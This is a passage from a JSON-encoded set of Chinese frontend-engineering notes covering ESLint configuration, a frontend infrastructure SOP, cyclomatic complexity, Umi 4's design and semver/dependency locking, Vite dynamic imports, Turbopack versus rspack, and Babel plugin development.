   // 关闭可能冲突的规则\n        'max-len': 'off'\n    }\n};\n```\n\n### 9.2. **自定义处理器**\n\n```javascript\n// 处理非 JavaScript 文件\nmodule.exports = {\n    processors: {\n        '.vue': require('eslint-plugin-vue/processor')\n    }\n};\n```\n\n\n\n","prF9WAU9":"\n# 前端基建 SOP\n\n`#devops` `#前端基建` \n\n\n- ==前期调研与规划==\n\t- 现状评估\n\t\t- 评估当前现状\n\t\t\t- 比如技术栈、构建工具、现有基础实施情况\n\t\t-  收集反馈和痛点\n\t\t\t- 开发==效率瓶颈==\n\t\t\t- 发布流程==痛点==\n\t- 制定规划路线图（Roadmap）\n\t\t- 确定优先级和里程碑\n\t\t- ==效率度量体系==建设\n- ==技术标准化建设==\n\t- 规范：js、css、git、目录\n\t- 工具：eslint、Prettier、StyleLint、Husky + lint-staged \n\t- 项目模板标准化\n- ==构建系统优化==\n\t- 构建工具链\n\t- 依赖管理\n\t\t- 依赖安全\n\t- 包管理\n\t\t- pnpm workspace\n\t\t- npm 私服\n- ==CI/CD 流程建设==\n\t- 持续集成（CI）\n\t\t- 自动化流程：提交 → check → 单侧 → 产物 → ==制片==\n\t\t- 内置质量把控：\n\t\t\t- 单侧、自动化测试 \n\t\t\t- 代码质量 sonar\n\t\t\t- 构建产物分析\n\t- 持续部署（CD）\n\t\t- **发布系统建设**\n\t\t\t- ==环境==管理\n\t\t\t- ==灰度==发布\n\t\t\t- 回滚机制\n\t\t\t- 发布==审批==流程\n\t\t- **部署策略**\n\t\t\t- 静态资源部署\n\t\t\t- CDN 分发\n\t\t\t- 缓存策略\n- ==监控与运维==\n\t- 性能监控\n\t- 用户行为监控\n\t- 业务监控\n\t- 错误监控\n\t- 运维支持\n\t\t- 日志系统\n\t\t\t- 日志收集\n\t\t\t- 错误追踪\n\t\t\t- 问题定位\n\t\t- 告警机制\n\t\t\t- 异常告警\n\t\t\t- 性能告警\n\t\t\t- 服务可用性监控\n\t\t\t- 业务监控\n\t\t\t\t- 比如流量突然下滑？\n- ==效能提升、工具建设、系统打通集成==\n\t- cli 工具\n\t\t- 打通各类系统环境\n\t\t- ==其他==\n\t\t\t- 文档与知识沉淀\n\t\t\t- 集成\n\t\t\t\t-  需求管理平台\n\t\t\t\t- 工单 & Bug 系统\n\t\t\t\t- 发布系统\n\t\t\t\t- 设计平台\n\t\t\t\t- 等等\n\t- 辅助开发\n\t- 集成==产研一体化平台的开发==\n\t- 可视化平台\n\t\t- 项目管理\n\t\t- 发布控制台\n\t\t- 监控面板\n\n\n","ihjW9xb7":"\n# 圈复杂度\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 定义：用于==度量代码复杂度==\n- 计算公式\n\t1. 每个`if`、`else if`、`while`、`for`、`case`等语句，复杂度 ==+1==。\n\t2. 每个逻辑运算符（如`&&`、`||`）==增加 1==。\n\t3. 每个`catch`块==增加 1==。\n\t4. 总体起始值为 `1`\n- 评估标准 : → ==10 以内，表示还可以==\n\t- ![图片&文件](./files/20250103-4.png)\n- 如何降低？\n\t- 减少嵌套，比如提请 return\n\t- 复杂的函数拆分为多个小函数，每个函数只处理单一逻辑\n\t- 用**多态或策略模式**替代复杂的`if-else`或`switch-case`逻辑\n\t- 使用代码质量工具（如 `SonarQube`、ESLint）自动检测圈复杂度，及时优化\n\n## 1. 圈复杂度（Cyclomatic Complexity）详解\n\n- **圈复杂度**是代码质量的一个重要衡量指标，用于评估程序的逻辑复杂度。\n- 它通过计算代码中的独立路径数量，来反映代码的复杂性和测试的难度。\n- 圈复杂度越高，代码的复杂性越大，维护难度越高，同时需要更多的测试用例来覆盖所有逻辑路径。\n\n---\n\n## 2. 圈复杂度的定义\n\n圈复杂度是根据程序的**控制流图（Control Flow Graph）**计算的，其中：\n- **节点**表示程序中的代码块（如语句、条件等）。\n- **边**表示代码块之间的控制流（如条件跳转、循环等）。\n\n**公式**：\n```\nM = E - N + 2P\n```\n\n- **M**：圈复杂度\n- **E**：图中的边数（Edges）\n- **N**：图中的节点数（Nodes）\n- **P**：程序的入口点数量（通常为1）\n\n---\n\n## 3. 圈复杂度的直观理解\n\n圈复杂度可以简单地理解为代码中**独立路径的数量**，即程序从开始到结束的所有可能执行路径的数量。  \n- **线性代码**（没有分支或循环）：圈复杂度为 1。\n- **每增加一个条件分支**（如`if`、`for`、`while`等），圈复杂度增加 1。\n\n---\n\n## 4. 圈复杂度的计算规则\n\n在实际中，我们可以通过以下规则快速估算圈复杂度：\n1. 每个`if`、`else if`、`while`、`for`、`case`等语句，复杂度 +1。\n2. 每个逻辑运算符（如`&&`、`||`）增加 1。\n3. 每个`catch`块增加 1。\n4. 总体起始值为 `1`\n\n---\n\n## 5. 圈复杂度的例子\n\n### 5.1. 示例 1：简单代码\n\n```javascript\nfunction add(a, b) {\n    return a + b;\n}\n```\n- 圈复杂度：1（没有分支或循环）\n\n### 5.2. 示例 2：带条件分支的代码\n\n```javascript\nfunction checkAge(age) {\n    if (age < 18) {\n        return 'Minor';\n    } else if (age >= 18 && age < 60) {\n        return 'Adult';\n    } else {\n        return 'Senior';\n    }\n}\n```\n\n- 圈复杂度：\n\t- 初始值为 1\n\t- 一个`if`语句 +1\n\t- 一个`else if`语句 +1\n\t- 一个逻辑运算符`&&` +1\n\t- 总复杂度：`1 + 1 + 1 + 1 = 4`\n\n### 5.3. 示例 3：带循环的代码\n\n```javascript\nfunction sumArray(arr) {\n    let sum = 0;\n    for (let i = 0; i < arr.length; i++) {\n        if (arr[i] > 0) {\n            sum += arr[i];\n        }\n    }\n    return sum;\n}\n```\n\n- 圈复杂度：\n\t- 初始值为 1\n\t- 一个`for`循环 +1\n\t- 一个`if`条件 +1\n\t- 总复杂度：`1 + 1 + 1 = 3`\n\n---\n\n## 6. 圈复杂度的意义\n\n### 6.1. **代码可维护性**\n\n圈复杂度越高，代码越复杂，维护成本越高。过高的圈复杂度可能导致：\n- 难以理解代码的逻辑。\n- 修改代码时容易引入新的问题。\n\n### 6.2. **单元测试**\n\n圈复杂度直接影响测试用例的数量：\n- 圈复杂度为 1：只需要一个测试用例。\n- 圈复杂度为 N：至少需要 N 个测试用例才能覆盖所有逻辑路径。\n\n### 6.3. **代码重构的参考**\n\n当圈复杂度过高时，可能需要对代码进行重构。例如：\n- 将复杂函数拆分为多个小函数。\n- 简化条件分支或循环逻辑。\n\n---\n\n## 7. 圈复杂度的标准\n\n以下是圈复杂度的常见评估标准：\n\n| 圈复杂度范围 | 代码复杂度等级 | 建议措施                  |\n|--------------|----------------|---------------------------|\n| 1-10         | 简单           | 可接受                   |\n| 11-20        | 中等复杂       | 需要关注，可能需要优化     |\n| 21-50        | 复杂           | 建议重构                 |\n| >50          | 非常复杂       | 必须重构，否则难以维护     |\n\n---\n\n## 8. 如何降低圈复杂度？\n\n### 8.1. **减少嵌套**\n\n- 避免过深的`if`、`else`嵌套，可以通过**提前返回**（early return）简化逻辑。\n   ```javascript\n   // 高复杂度\n   function validate(input) {\n       if (input) {\n           if (input.length > 0) {\n               if (input.isValid) {\n                   return true;\n               }\n           }\n       }\n       return false;\n   }\n\n   // 优化后\n   function validate(input) {\n       if (!input || input.length === 0 || !input.isValid) {\n           return false;\n       }\n       return true;\n   }\n   ```\n\n### 8.2. **拆分函数**\n\n   - 将复杂的函数拆分为多个小函数，每个函数只处理单一逻辑。\n   ```javascript\n   // 高复杂度\n   function processOrder(order) {\n       if (order.isValid) {\n           if (order.isPaid) {\n               // 处理已支付订单\n           } else {\n               // 处理未支付订单\n           }\n       }\n   }\n\n   // 优化后\n   function validateOrder(order) { ... }\n   function processPaidOrder(order) { ... }\n   function processUnpaidOrder(order) { ... }\n   ```\n\n### 8.3. **使用多态或策略模式**\n\n   - 用**多态或策略模式**替代复杂的`if-else`或`switch-case`逻辑。\n\n### 8.4. **合理使用工具**\n\n   - 使用代码质量工具（如 `SonarQube`、ESLint）自动检测圈复杂度，及时优化。\n\n---\n\n## 9. 总结\n\n圈复杂度是衡量代码复杂性的重要指标，通过分析代码的逻辑路径数量，可以帮助开发者：\n- 判断代码的可维护性。\n- 评估测试用例的覆盖情况。\n- 提示需要重构的复杂代码。\n\n在实际开发中，保持圈复杂度在合理范围内（**通常不超过 10**）是提高代码质量的重要手段。","wvvKr2Gu":"\n# Umi 4 的设计思路\n\n`#前端工程化` `#2022/12`  \n\n\n## 目录\n<!-- toc -->\n ## 总结 \n\n- 最佳工程化的实践集合\n- 那么`编译时框架`和`非编译时框架`的区别是啥？\n\t- `非编译时框架`\n\t\t- 比如非常流行的 `create-react-app`，把源码简单直接地交给 `webpack` 就完成使命；\n\t- `编译时框架`则会自己加很多戏\n\t\t- 比如拿到源码后==做 ast 分析，拿到依赖图谱，做检查，生成临时文件==，等等，\n\t\t\t- 最后把编译后的源码交给 `webpack`，这中间的很多事，本来是需要开发者手动处理或编码的。\n- 约点\n\t- 比如在 `pages` 目录下新建文件即是**路由**\n\t- 新建 `access.ts` 文件即是**权限**\n\t- 在 `locales` 目录下新建文件即是`国际化语言`\n\t- 等等\n- Normal Mode 、 Low Import Mode \n\t- improt all from umi\n- `Semver` ==Semantic Versioning（语义化版本）== 的问题 ？\n- 预打包\n\t- ncc\n\t\t- 用于将 Node.js 模块**编译成一个单一文件，连同其所有依赖项，类似于 gcc 风格**。\n\t- 通过 `ncc` 和 `dts-packer` 实现\n\t\t- 会分别在 compiled/webpack 目录生成 `index.js` 和 `index.d.ts`，以实现预打包的目的\n- esm cdn & npm cdn 方案\n- 数据量化\n\t- 服务了多少个项目？\n\n> 来自 umi 作者 CC 的分享： https://www.yuque.com/seeconf/2022/ibm88n\n\n## 1. 最佳工程化的实践集合\n\n![图片&文件](./files/20241210-1.png)\n\n## 2. 特点\n\n- all in one\n\t- improt all from umi\n\t- low import mode\n- 约束与开放\n\t- 强约束\n- 编译时框架\n- 双引擎构建\n- esm cdn\n- 应用云数据\n\n![图片&文件](./files/20241210-2.png)\n\n## 3. 编译时框架\n\n![图片&文件](./files/20241210-3.png)\n\n相比 10 年前前端编码有了很多变化，以下这些是和**编译时**相关的。\n\n- 代码写少了\n\t- 少了很多脚手架代码\n\t\t- 比如数据流、国际化、模块加载、路由等，从而让开发者有更多精力**专注在业务视图和逻辑上**；\n- 报错提前了\n\t- 比如模块不存在，使用了不存在的变量，之前是运行时才能发现，现在**报错提前了**，在**命令行里就能看到**。\n\t- 除了 DX 的提升，额外的好处的此类问题不会再被带到线上；\n- 产物变小了\n\t- 之前用一个 button 要引入整个 antd，用一个 isEqual 要引入整个 lodash\n\t- 现在通过 tree-shaking 或 babel-plugin-import 或 TailwindCSS 的 JIT 引擎，能准确知道你用了啥，然后做按需打包，让产物变小；\n- 功能==配置化==了\n\t- 现在很多标准化的功能都配置化了，比如想要兼容 ie11，做个配置，框架就会在背后加补丁，转 es 5，\n\t- 比如想要用 `external` 自动`提速`，想要`高清`方案，想要`埋点`，想要用 `esbuild 压缩`，都是一个**配置的事情**；\n- 配置==约定化==了\n\t- 有些场景配置化还是繁琐了，比如路由、数据流 model、国际化语言文件，可以通过约定的方式，就没必要做配置了；\n\n这是因为框架都帮你做了\n\n![图片&文件](./files/20241210-4.png)\n\n那么`编译时框架`和`非编译时框架`的区别是啥？\n- `非编译时框架`\n\t- 比如非常流行的 `create-react-app`，把源码简单直接地交给 `webpack` 就完成使命；\n- `编译时框架`则会自己加很多戏\n\t- 比如拿到源码后==做 ast 分析，拿到依赖图谱，做检查，生成临时文件==，等等，\n\t\t- 最后把编译后的源码交给 `webpack`，这中间的很多事，本来是需要开发者手动处理或编码的。\n\n### 3.1. 社区的编译ui\n\n![图片&文件](./files/20241210-6.png)\n\n\n社区有很多编译时的尝试\n- 比如 Angular 的 AOT 和 JIT，可以==简单理解 AOT 为编译时，JIT 为运行时==\n\t- AOT 可以让产物更小，同时运行更快；\n- 比如 facebook 之前出的 `prepack`，也是编译时优化的尝试，在保证结果一致的前提下，改变源码，让性能更快；\n- 还有最近的 `React Forget` 更是编译时优化的典型。\n\nUmi 做了很多编译时的事，如果你用过 umi，应该了解 src 下有个 `.umi 临时目录`，\n- 这里存放的文件本是需要开发者自己写的，现在由框架或插件在编译时自动生成。\n\t- 比如在 `pages` 目录下新建文件即是**路由**\n\t- 新建 `access.ts` 文件即是**权限**\n\t- 在 `locales` 目录下新建文件即是`国际化语言`\n\t- 等等\n\n### 3.2. Normal Mode 、 Low Import Mode \n\n![图片&文件](./files/20241210-7.png)\n\n\n- 这部分的 `One More Thing` 是 `Low Import` 开发模式，他会随着 Umi 4 发布，但默认不开启。\n- 左图是开启前，右图是开启后，区别是`大部分 import 语句`不用写，交给框架自动补全。\n\t- `webstorm` 报错怎么办？\n- 这个方案很有争议，喜欢的很喜欢，不喜欢的很不喜欢，但不管如何，这也是编译时领域的一次尝试。\n\n### 3.3. 依赖预打包\n\n![图片&文件](./files/20241210-8.png)\n\n- 不知大家是否有此经历。睡一觉醒来，很多事发生了变化。\n- 比如 dev 或 build 跑不起来，啥都没干迭代发布后线上白屏还背了个故障\n\t- `npm i` 时出现某人的求职广告，依赖库被黑客挂马，等等。\n\t- 之前 ==antd 版本圣诞节那天== ，logo 出现圣诞帽\n- 然后你打开 **package.json 一看，只有 10 个依赖呀，我还写死了版本**，这是为啥？\n\t- 因为你忽略了成千上万的间接依赖，而这些依赖总有一个会发生点意外，比如某个依赖的不兼容更新，就会导致你项目挂掉\n\n### 3.4. 附：Semver\n\n`Semver` 是 ==Semantic Versioning（语义化版本）==的缩写\n\n#### 3.4.1. Semver 基本结构\n\n版本号格式：**主版本号.次版本号.修订号**（MAJOR.MINOR.PATCH）\n\n````mermaid\n  graph TB\n    A[2.3.4] --> B[主版本号<br>Major<br>2]\n    A --> C[次版本号<br>Minor<br>3]\n    A --> D[修订号<br>Patch<br>4]\n    \n    B --> B1[破坏性更新<br>不兼容的API修改]\n    C --> C1[新功能<br>向下兼容]\n    D --> D1[Bug修复<br>向下兼容]\n\n    style A fill:#f9f,stroke:#333,stroke-width:4px\n    style B fill:#bbf,stroke:#333,stroke-width:2px\n    style C fill:#bbf,stroke:#333,stroke-width:2px\n    style D fill:#bbf,stroke:#333,stroke-width:2px\n````\n\n#### 3.4.2. 版本号含义\n\n1. **主版本号（Major）**\n   - 当进行不兼容的 API 修改时递增\n   - 例如：从 1.x.x 升级到 2.0.0\n\n2. **次版本号（Minor）**\n   - 当==添加功能但保持向下兼容时==递增\n   - 例如：从 1.1.x 升级到 1.2.0\n\n3. **修订号（Patch）**\n   - 当==做向下兼容的缺陷修复时==递增\n   - 例如：从 1.1.1 升级到 1.1.2\n\n#### 3.4.3. 版本范围符号\n\n```json\n{\n  \"dependencies\": {\n    \"package1\": \"^1.2.3\",  // 兼容 1.x.x\n    \"package2\": \"~1.2.3\",  // 兼容 1.2.x\n    \"package3\": \">=1.2.3\", // 大于等于 1.2.3\n    \"package4\": \"1.2.3\",   // 精确版本 1.2.3\n    \"package5\": \"*\"        // 任意版本\n  }\n}\n```\n\n符号说明：\n- `^`：允许次版本和修订版本更新\n- `~`：只允许修订版本更新\n- `>`：大于指定版本\n- `>=`：大于等于指定版本\n- `<`：小于指定版本\n- `<=`：小于等于指定版本\n- `*`：任意版本\n- `x`：任意版本（同 `*`）\n\n#### 3.4.4. 版本示例\n\n```plaintext\n版本号示例：\n1.0.0：首个稳定版本\n1.0.1：修复bug\n1.1.0：添加新功能，向下兼容\n2.0.0：进行了破坏性更新\n```\n\n#### 3.4.5. 预发布版本\n\n```plaintext\n预发布版本标识：\n1.0.0-alpha：内部测试版\n1.0.0-beta：公测版本\n1.0.0-rc：候选发布版\n```\n\n#### 3.4.6. 实际应用场景\n\n```json\n// package.json 示例\n{\n  \"name\": \"my-project\",\n  \"version\": \"1.2.3\",\n  \"dependencies\": {\n    // 生产环境依赖推荐使用确切版本\n    \"react\": \"17.0.2\",\n    \n    // 开发依赖可以使用更宽松的版本范围\n    \"typescript\": \"^4.5.0\",\n    \n    // 测试框架版本\n    \"jest\": \"~27.0.0\"\n  }\n}\n```\n\n#### 3.4.7. 版本选择建议\n\n1. **生产依赖**\n   - 使用精确版本号\n   - 避免使用 `^` 或 `~`\n   - 手动控制版本更新\n\n2. **开发依赖**\n   - 可以使用 `^` 获取新特性\n   - 使用 `~` 获取bug修复\n   - 定期更新和测试\n\n3. **测试依赖**\n   - 可以使用较宽松的版本范围\n   - 注意主版本更新的破坏性变更\n\n#### 3.4.8. 最佳实践\n\n1. **版本锁定**\n   ```bash\n   # 生成 package-lock.json\n   npm install --save-exact\n   ```\n\n2. **版本更新**\n   ```bash\n   # 检查过时的包\n   npm outdated\n   \n   # 更新到新版本\n   npm update\n   ```\n\n3. **安全性检查**\n   ```bash\n   # 检查安全漏洞\n   npm audit\n   \n   # 修复安全问题\n   npm audit fix\n   ```\n\n#### 3.4.9. 注意事项\n\n1. **避免使用不安全的版本范围**\n   - 不要使用 `*`\n   - 谨慎使用 `>`\n   - 避免过于宽松的版本范围\n\n2. **保持依赖更新**\n   - 定期检查更新\n   - 测试新版本\n   - 记录更新日志\n\n3. **版本控制**\n   - 提交 package-lock.json\n   - 统一团队版本管理策略\n   - 建立版本更新流程\n\n#### 3.4.10. 依赖冲突问题\n\n```plaintext\n项目结构示例：\nmy-app\n├── package.json\n├── node_modules\n│   ├── package-a (依赖 lodash@^4.0.0)\n│   └── package-b (依赖 lodash@^3.0.0)\n```\n\n#### 3.4.11. 过于宽松的版本范围\n\n```json hl:3\n{\n  \"dependencies\": {\n    // 危险的版本范围\n    \"express\": \"^4.0.0\",    // 可能引入破坏性更新\n    \"lodash\": \"*\",          // 完全不限制版本\n    \"moment\": \">=2.0.0\"     // 过于宽泛的范围\n  }\n}\n```\n\n#### 3.4.12. 锁文件问题\n\n```json hl:7\n// package-lock.json 示例\n{\n  \"name\": \"my-project\",\n  \"dependencies\": {\n    \"package-a\": {\n      \"version\": \"1.2.3\",\n      \"resolved\": \"https://registry.npmjs.org/package-a/-/package-a-1.2.3.tgz\",\n      \"integrity\": \"sha512...\"\n    }\n  }\n}\n```\n\n#### 3.4.13. 使用精确版本\n\n```json\n{\n  \"dependencies\": {\n    \"express\": \"4.17.1\",        // 精确版本\n    \"react\": \"17.0.2\",          // 精确版本\n    \"typescript\": \"4.5.4\"       // 精确版本\n  }\n}\n```\n\n#### 3.4.14. 使用 package-lock.json\n\n```bash\n# 确保团队成员都使用锁文件\nnpm ci  # 而不是 npm install\n```\n\n#### 3.4.15. 版本固定策略\n\n```json\n{\n  \"dependencies\": {\n    // 使用更严格的版本范围\n    \"express\": \"~4.17.1\",     // 只允许补丁版本更新\n    \"react\": \"16.14.0\",       // 完全固定版本\n    \"lodash\": \"4.17.x\"        // 限制在特定次版本内\n  }\n}\n```\n\n#### 3.4.16. 版本控制策略\n\n```bash\n// .npmrc 文件配置\nsave-exact=true              # 保存精确版本\npackage-lock=true           # 启用锁文件\n```\n\n#### 3.4.17. 依赖审查\n\n```bash\n# 定期检查依赖更新\nnpm audit                    # 安全审计\nnpm outdated                # 检查过时包\n```\n\n#### 3.4.18. 依赖树分析\n\n```bash\n# 查看依赖树\nnpm ls                      # 查看完整依赖树\nnpm ls package-name        # 查看特定包的依赖关系\n\n# 扁平化依赖\nnpm dedupe                 # 删除重复依赖\n```\n\n#### 3.4.19. 版本冲突解决\n\n```bash\n# 强制解析到特定版本\nnpm install package@version --force\n\n# 或使用 resolutions（在 package.json 中）\n{\n  \"resolutions\": {\n    \"package-name\": \"1.2.3\"\n  }\n}\n```\n\n#### 3.4.20. 预防措施\n\n1. **使用锁文件**\n   - 始终提交 package-lock.json\n   - 使用 `npm ci` 而不是 `npm install`\n\n2. **版本策略**\n   - 为生产依赖使用精确版本\n   - 为开发依赖使用更宽松的版本范围\n\n3. **定期维护**\n   - 定期更新依赖\n   - 运行安全审计\n   - 测试新版本的兼容性\n\n4. **工具支持**\n   - 使用 `npm-check-updates`\n   - 配置自动化依赖更新工具\n   - 使用 CI/CD 进行依赖检查\n\n#### 3.4.21. 自定义 npm 配置\n\n```ini\n# .npmrc\nsave-exact=true\npackage-lock=true\naudit=true\nfund=false\n```\n\n#### 3.4.22. 使用工作区\n\n```json\n// package.json\n{\n  \"workspaces\": [\n    \"packages/*\"\n  ]\n}\n```\n\n### 3.5. Semver 的理想和现实\n\n![图片&文件](./files/20241210-9.png)\n\n### 3.6. 社区的解\n\n![图片&文件](./files/20241210-10.png)\n\n临时的解决：\n- 比如 `cnpm` 提供的 `bug-versions`\n- npm 提供的 `resolutions`，侵入式改代码的 `patch-package` 等；\n长期的\n- 比如 npm、yarn 和 pnpm 具备的 `lock 能力`，tnpm/cnpm 目前暂不支持，但可以用 yarn mode。\n\n### 3.7. 框架的解\n\n还有个思路是「中间商锁依赖，定期更新，并对此负责」。==框架是开发者的倒数第二道防线==，自然而然就应该是这个中间商。\n\n![图片&文件](./files/20241210-11.png)\n\n这个思路在 Umi 里的实现是**依赖预打包**。\n- 打包前，Umi 通过 `dependency` 依赖 webpack、babel 等，这时如果 babel 出现 bug，会导致 umi 挂，然后用户项目也挂，睡不好，😴；\n- 打包后，Umi 通过 `devDependency` 依赖 webpack、babel 等，如果 babel 又出现 bug，Umi 会不会受影响，Umi 用户的项目也不会受影响，睡得香，😄。\n\n### 3.8. 怎么预打包\n\n![图片&文件](./files/20241210-12.png)\n\n- https://github.com/vercel/ncc\n\t- 简单的命令行工具，用于将 Node.js 模块**编译成一个单一文件，连同其所有依赖项，类似于 gcc 风格**。\n\n- 简单介绍下如何预打包，分代码和类型定义两部分\n\t- 分别通过 ncc 和 dts-packer 实现。\n\t\t- 比如 webpack，借助两个工具，会分别在 compiled/webpack 目录生成 `index.js` 和 `index.d.ts`，以实现预打包的目的\n\n### 3.9. Father\n\n这部分的 One More Thing 是 Father 的下个版本 V4，他是基于 Umi 的组件打包工具，在 V4 里，除了其他 nb 的特性外，还有个重要的点就是前面我们介绍的依赖预打包功能，大家可以期待下。\n\n![图片&文件](./files/20241210-13.png)\n\n## 4. 数据量化\n\n- 服务了 `10000+` 项目\n\t- 如何统计呢？","VRabtZlK":"\n# vite 之 import 关键词\n\n`#vite` `#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- `import` 必须放在文件开头\n- `import()` 可以在任何位置使用\n\t- 需 ==返回 Promise==\n\t- 按需加载和条件加载\n\t\t- 根据环境变量\n\t\t\t- 比如 import(env.xx.xx)\n\t\t- 多语言加载\n\t\t\t- 语言变量\n\t\t- 路由懒加载\n\t- 可使用 `await` 关键词\n\n## 2. import 是否必须放在文件开头？\n\n**答案：不是必须的，但有特定规则**\n\n1. **静态 import**\n```javascript\n// 静态导入必须在顶层作用域\nimport Vue from 'vue'\nimport Router from 'vue-router'\n```\n\n- 必须在模块顶层\n- 不能在函数、条件语句或循环中使用\n- 路径必须是字符串字面量，不能是变量\n\n2. **动态 import()**\n```javascript\n// 可以在任何位置使用\nasync function loadModule() {\n  if (condition) {\n    const module = await import('./moduleA.js')\n    // 使用 module\n  } else {\n    const module = await import('./moduleB.js')\n    // 使用 module\n  }\n}\n```\n- 可以在任何位置使用\n- ==返回 Promise==\n- 支持动态路径\n\n## 3. import(env.xx.xx) 的用处\n\n这种形式通常用于**动态导入**和**环境变量**结合的场景：\n\n1. **根据环境变量加载不同配置**\n```javascript\n// 根据环境加载不同配置文件\nconst config = await import(`./config/${process.env.NODE_ENV}.js`)\n```\n\n2. **按需加载组件**\n```javascript\n// Vue 路由中的动态导入\nconst routes = [\n  {\n    path: '/dashboard',\n    component: () => import('./views/Dashboard.vue')\n  }\n]\n```\n\n3. **常见使用场景**：\n\n### 3.1. 环境配置加载\n\n```javascript\n// 根据不同环境加载不同配置\nconst envConfig = await import(`./config/env.${process.env.NODE_ENV}.js`)\n```\n\n### 3.2. 多语言文件加载\n\n```javascript\n// 动态加载语言包\nconst loadLanguage = async (lang) => {\n  const messages = await import(`./locales/${lang}.js`)\n  return messages.default\n}\n```\n\n### 3.3. 按需加载模块\n\n```javascript\n// 条件加载大型库\nasync function loadChart() {\n  if (needChart) {\n    const { Chart } = await import('chart.js')\n    return new Chart(/*...*/)\n  }\n}\n```\n\n### 3.4. 路由懒加载\n\n```javascript\n// Vue Router 配置\nexport const routes = [\n  {\n    path: '/admin',\n    component: () => import(\n      /* webpackChunkName: \"admin\" */ \n      './views/Admin.vue'\n    )\n  }\n]\n```\n\n## 4. 动态导入的优势\n\n1. **性能优化**\n   - 减少初始加载时间\n   - 实现代码分割\n   - 按需加载资源\n\n2. **灵活性**\n   - 运行时决定加载模块\n   - 支持条件加载\n   - 处理动态路径\n\n3. **资源管理**\n   - 更好的内存使用\n   - 更高效的资源加载\n   - 优化应用性能\n\n## 5. 使用示例\n\n1. **条件加载模块**：\n```javascript\nasync function loadFeature() {\n  if (userHasPermission) {\n    const module = await import('./features/advanced.js')\n    module.init()\n  }\n}\n```\n\n2. **动态路径加载**：\n```javascript\nasync function loadPlugin(pluginName) {\n  try {\n    const plugin = await import(`./plugins/${pluginName}.js`)\n    return plugin.default\n  } catch (error) {\n    console.error(`Plugin ${pluginName} not found`)\n  }\n}\n```\n\n3. **环境特定代码**：\n```javascript\n// 根据环境变量加载不同的 API 配置\nconst apiConfig = await import(`./config/api.${import.meta.env.MODE}.js`)\n```\n\n## 6. 总结\n\n1. **静态 import**\n\t- 必须在模块顶层\n\t- 路径必须是静态的\n\t- 用于基础依赖导入\n\n2. **动态 import()**\n\t- 可在任何位置使用\n\t- 支持动态路径\n\t- 适合按需加载和条件加载\n\n3. **import(env.xx.xx)**\n\t- 用于动态配置加载\n\t- 环境特定代码处理\n\t- 实现灵活的模块加载策略\n\n","hoGy6p88":"\n# Turbopack 与 rspack\n\n`#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- rspack \n\t- 兼容 webpack \n\t- 性能不如 Turbopack\n\t- 热更新 ms 级别\n- Turbopack \n\t- 仅支持 next.js\n\t- 增量编译优化\n\t- 原生支持 React 服务端组件（`RSC`）\n\t- 做到`函数级别缓存`\n","hsJa6BwX":"\n# 使用 Babel 重构或迁移前端工程\n\n`#前端研效` `#babel` `#前端工程化`\n\n> Babel 不仅可以转换单个文件，还能够处理整个项目的代码结构，并生成新的目录结构和代码。这在项目重构、代码迁移等场景下特别有用\n\n- 目的：项目重构、代码迁移\n- 步骤\n\t- **目录扫描**\n\t\t- 递归遍历源代码目录\n\t\t- 识别 JavaScript/TypeScript 文件\n\t- **代码分析**\n\t\t- 解析 AST\n\t\t- 提取依赖关系\n\t\t- 构建依赖图\n\t- **代码转换**\n\t\t- 应用 Babe l转换\n\t\t\t- 使用 babel 来处理 JS 文件\n\t\t- 保持目录结构\n\t\t- 生成新的代码文件\n\t- **结构维护**\n\t\t- 保持原有的目录层次\n\t\t- 维护模块间的依赖关系\n","l3NvVg0Y":"\n# npm 私服\n\n`#npm` `#前端工程化` \n\n\n- Nexus Repository\n- CNPM\n- JFrog Artifactory\n","HwGwOnRx":"\n# Babel 插件开发\n\n`#babel` `#前端工程化` \n\n\n## 目录\n<!-- toc -->\n ## 1. 总结 \n\n- Babel 插件==本质上==是通过==访问者模式==来操作 AST\n\t- 再具体点，就是==多叉树的遍历==\n\t- 并在遍历过程中对其进行==修改==\n\t\t- 看下面 ==移除 console.log 的示例==\n- 使用场景\n\t- es6 → es5\n\t- JSX 转换为普通 JavaScript \n\t- ts → es5\n- 示例：移除 console.log\n\t- ![图片&文件](./files/20250103-5.png)\n\n## 2. Babel 插件的基本概念\n\nBabel 插件本质上是通过访问者模式（Visitor Pattern）来操作 AST（抽象语法树）。\n\n每个插件都可以访问源代码的语法树，并在遍历过程中对其进行修改。\n\n## 3. 常见的 Babel 插件使用场景\n\n1. **代码转换**\n   - ES6+ 语法转换为 ES5\n   - TypeScript&Flow 类型注解的移除\n   - JSX 转换为普通 JavaScript \n\n1. **开发环境优化**\n   - 移除测试相关的代码\n      - （如 data-testid 属性）\n   - 条件编译\n   - 开发环境特定代码的处理 \n\n## 4. 插件开发步骤\n\n1. **理解 AST**\n   - 首先需要理解代码的 AST 结构\n   - 使用 AST Explorer 工具来可视化 AST\n   - 确定需要转换的节点类型\n\n2. **实现访问者对象**\n```javascript\nmodule.exports = function(babel) {\n  return {\n    visitor: {\n      // 访问特定类型的节点\n      Identifier(path) {\n        // 转换逻辑\n      }\n    }\n  };\n}\n```\n\n## 5. 实际案例示例\n\n以下是一个简单的 Babel 插件示例，用于移除代码中的 console.log：\n\n```javascript\nmodule.exports = function(babel) {\n  const { types: t } = babel;\n  return {\n    name: \"remove-console\",\n    visitor: {\n      CallExpression(path) {\n        if (path.node.callee.type === \"MemberExpression\" &&\n            path.node.callee.object.name === \"console\" &&\n            path.node.callee.property.name === \"log\") {\n          path.remove();\n        }\n      }\n    }\n  };\n};\n```\n\n## 6. 开发建议\n\n1. **测试驱动开发**\n   - 编写单元测试确保转换正确\n   - 使用 babel-plugin-tester 进行测试\n   - 考虑边界情况\n\n2. **性能考虑**\n   - 避免不必要的遍历\n   - 缓存重复使用的数据\n   - 优化转换逻辑\n\n3. **调试技巧**\n   - 使用 console.log 打印 AST 节点\n   - 利用断点调试\n   - 使用 AST 可视化工具\n\n## 7. 实际应用场景\n\n1. **自动国际化**\n   - 自动提取文本到语言文件\n   - 替换硬编码的字符串\n   - 添加 i18n 包装器\n\n2. **代码优化**\n   - ==自动引入模块==\n   - 删除未使用的代码\n   - 转换特定的语法结构\n\n3. **开发工具支持**\n   - 自动生成文档\n   - 代码检查\n   - 自动化重构\n\n通过开发 Babel 